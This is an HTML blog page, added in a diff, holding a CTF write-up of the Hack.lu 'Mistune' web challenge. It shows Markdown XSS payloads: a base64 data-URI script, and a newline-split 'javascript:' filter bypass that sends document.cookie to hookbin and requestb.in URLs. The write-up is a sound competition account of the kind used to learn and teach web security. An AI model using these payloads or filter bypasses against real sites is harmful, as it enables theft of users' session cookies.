@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+  <title>
+    
+      [HACK.LU-CTF] Mistune (Web) &middot; Rot26
+    
+  </title>
+
+  
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
+<link rel="shortcut icon" href="/favicon.ico" />
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />
+
+  <!-- Additional head bits without overriding original head -->
+</head>
+
+
+  <body class="page">
+
+    <div id="sidebar">
+  <header>
+    <div class="site-title">
+      <a href="/">
+        
+          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+  <path d="M0 0h24v24H0z" fill="none"/>
+  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+</svg></span>
+        
+        Rot26
+      </a>
+    </div>
+    <p class="lead"></p>
+  </header>
+  <nav id="sidebar-nav-links">
+  
+  
+
+  
+
+  
+
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+
+  
+
+
+  
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/BreizhCTF.html">BreizhCTF</a>
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/Hacklu.html">Hacklu</a>
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/LabyREnth.html">LabyREnth</a>
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+
+  <h1>Members</h1>
+<a href="https://twitter.com/Memoi2001">Fooker</a>
+<a href="https://twitter.com/kalimer0x00">Kalimer0x00</a>
+<a href="https://twitter.com/govlog">Govlog</a>
+<a href="https://twitter.com/maxencedun">Sp4rKy</a>
+
+
+</nav>
+
+
+  
+
+  <nav id="sidebar-icon-links">
+  
+
+  <a id="subscribe-link"
+     class="icon" title="Subscribe" aria-label="Subscribe"
+     href="/feed.xml">
+    <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <circle cx="6.18" cy="17.82" r="2.18"/>
+    <path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/>
+</svg>
+  </a>
+
+  
+  
+  
+  
+
+  
+
+  
+
+  <!-- Optional additional links to insert for icons links -->
+</nav>
+  
+</div>
+
+    <main class="container">
+      <div class="content">
+  <h1 id="hacklu-ctf-mistune-web">[HACK.LU-CTF] Mistune (Web)</h1>
+<h5 id="description--markdown-parsers-are-fun-now-click-here-and-steal-the-cookie"><strong>Description :</strong> Markdown parsers are fun. Now click here and steal the cookie!</h5>
+
+<p>In this challenge, we have two forms to submit Markdown code that is parsed by Mistune.
+The first form is for testing purposes and the second one’s sent contents are read by an admin bot which has the flag in it’s cookies.</p>
+
+<p>In markdown syntax, we can create a XSS payload by using the link creation directive :</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">mylink</span><span class="p">](</span><span class="nx">https</span><span class="p">:</span><span class="c1">//www.google.com)</span>
+<span class="p">[</span><span class="nx">xss</span><span class="p">](</span><span class="nx">javascript</span><span class="p">:</span><span class="nx">alert</span><span class="s2">`1`</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Mistune parser filters out the <strong>javascript:</strong> token. We need to find a way to bypass this filter to get a working XSS payload.
+To do so, we try to use <strong>data:text/html</strong> but it only works on Firefox browser.</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">click</span><span class="p">](</span><span class="nx">data</span><span class="p">:</span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span><span class="nx">base64</span><span class="p">,</span><span class="nx">PHNjcmlwdD53aW5kb3cubG9jYXRpb24gPSAiaHR0cHM6Ly9ob29rYmluLmNvbS9iaW4vdkRrWDlyanc</span><span class="o">/</span><span class="nx">YWRtaW5fY29va2llPSIrZG9jdW1lbnQuY29va2llPC9zY3JpcHQ</span><span class="o">+</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We found some bypasses on Mistune’s github <a href="https://github.com/lepture/mistune/issues/87">Issue#87</a> but they are inefficient since the parser is up-to-date.</p>
+
+<p>After many trials and errors, we came up with a filter bypass! The mighty newline character <strong>\n</strong> !
+It’s stripped out by the browser thus leading to a working XSS payload.</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">xss</span><span class="p">](</span><span class="nx">javascript</span>
+<span class="p">:</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s2">"https://requestb.in/XXXXXXX?fckadmins="</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Boom! We got the flag!</p>
+
+</div>
+
+    </main>
+
+    <!-- Optional footer content -->
+
+  </body>
+</html>
